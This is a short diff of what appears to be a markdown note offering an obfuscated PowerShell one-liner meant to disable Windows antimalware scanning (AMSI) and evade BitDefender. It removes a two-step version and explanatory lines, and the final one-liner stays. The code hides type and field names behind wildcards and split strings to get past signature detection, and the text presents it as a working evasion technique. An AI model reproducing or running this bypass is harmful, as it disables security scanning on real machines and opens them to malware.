@@ -1,17 +1,1 @@
-Second generation with extra obfuscation for BitDefender
-
-```
-$m=[ref].assembly.DefinedTypes|?{$_.name -like "*Iu*i*s"}|%{$_.getfields('no'+'NP'+'ubl'+'ic,st'+'At'+'i'+'c')}|?{$_.name -like "*fa**d"};
-```
-
-then
-
-```
-$m.setvalue(0,1-eq1)
-```
-
-If you have no option but to run it as a one-liner, you can try this, which should still evade signature detection from the original:
-
-```
 $m=[ref].assembly.DefinedTypes|?{$_.name -like "*Iu*i*s"}|%{$_.getfields('no'+'NP'+'ubl'+'ic,st'+'At'+'i'+'c')}|?{$_.name -like "*fa**d"}|%{$_.setvalue(0,1-eq1)}
-```
